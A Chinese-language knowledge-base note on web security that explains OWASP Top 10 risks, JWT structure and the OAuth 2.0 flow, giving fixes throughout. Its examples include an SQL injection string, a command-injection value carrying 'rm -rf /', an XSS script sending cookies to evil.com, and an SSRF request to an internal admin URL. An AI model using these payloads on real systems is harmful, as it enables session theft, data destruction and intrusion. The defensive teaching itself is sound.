---
title: Web Security
created: 2026-07-22
updated: 2026-07-22
type: concept
tags: [security, web, attack, defense]
sources: []
confidence: high
---

# Web 安全

## 定义

Web 安全研究如何保护 Web 应用免受攻击。随着所有应用走向 Web，Web 安全是所有开发者的必修课——不是"可选"。

## OWASP Top 10

OWASP（Open Web Application Security Project）每几年发布最危险的 Web 安全风险排名：

### 1. Broken Access Control
未授权访问其他用户的数据或操作。

```
# 坏：靠 URL 参数鉴权
GET /user/1234/info  # 改成 1235 就能看别人的
```

修复：服务端验证每个请求的权限。

### 2. Cryptographic Failures
敏感数据明文传输或存储。

| 错误 | 正确 |
|------|------|
| HTTP 传输密码 | 强制 HTTPS |
| 明文存密码 | bcrypt / Argon2id |
| MD5/SHA1 | SHA-256+ |

### 3. Injection (注入攻击)

**SQL 注入**：
```sql
-- 用户输入: ' OR '1'='1
SELECT * FROM users WHERE name = '' OR '1'='1';
-- 返回所有用户！
```

修复：**参数化查询（Prepared Statements）**，永远不要拼接 SQL。

**命令注入**：
```python
# 坏
os.system(f"ping {user_input}")
# 用户输入: 8.8.8.8; rm -rf /
```

修复：不用 shell=True，使用参数化 API。

### 4. XSS (跨站脚本)

**Stored XSS**：恶意脚本存入数据库，其他用户浏览时执行。
```html
<!-- 用户发帖内容 -->
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
```

**Reflected XSS**：恶意脚本在 URL 参数中，立即反射到页面。

修复：
- **输出编码**（HTML Entity Encoding）
- Content-Security-Policy (CSP) header
- HttpOnly Cookie（JS 无法读取）

### 5. CSRF (跨站请求伪造)

```
用户在 Bank.com 已登录
↓
访问 Evil.com
↓
Evil.com 自动提交 <form action="bank.com/transfer" method="POST">
天真的浏览器会带上 Bank.com 的 Cookie
→ 钱被转走了
```

修复：
- **CSRF Token**：表单带随机 token，服务器验证
- SameSite Cookie：`Set-Cookie: session=...; SameSite=Strict`
- 验证 Referer/Origin header

### 6. SSRF (服务端请求伪造)
攻击者让服务器代发请求到内网设备。

```
用户提交: URL=http://192.168.1.1/admin/delete-all
服务器:  fetch(user_url)  # 从内网发请求
→ 内网设备被攻击
```

修复：URL 白名单、禁止内网 IP、DNS rebinding 防护。

## 其他关键技术

| 技术 | 用途 |
|------|------|
| JWT | 无状态认证 token |
| OAuth 2.0 | 第三方授权委托 |
| OpenID Connect (OIDC) | OAuth 2.0 + 身份认证层 |
| CORS | 跨域资源共享控制 |
| CSP | 限制页面可加载/执行的资源 |
| HSTS | 强制 HTTPS |
| Subresource Integrity (SRI) | 校验 CDN 资源完整性 |

## JWT 解剖

```
Header.Payload.Signature
eyJhbG... .eyJzdWI... .SflKxw...
```

- **Header**：`{"alg": "HS256", "typ": "JWT"}`
- **Payload**：`{"sub": "123", "name": "Alice", "exp": 1710000000}`
- **Signature**：`HMAC-SHA256(base64(header) + "." + base64(payload), secret)`

⚠️ JWT 不是"安全"的——Payload 只是 Base64 编码（可读），不是加密！

## OAuth 2.0 流程

```
User → Client App → Authorization Server
                        ↓ 用户登录并授权
Client ← Auth Code ←───┘
Client → Auth Server: code + client_secret
Client ← Access Token
Client → Resource Server: Bearer <token>
```

## 关系

- [[cryptography]]
- [[tls-ssl]]
- [[http]]
- [[html-css]] — XSS 涉及 HTML/JS
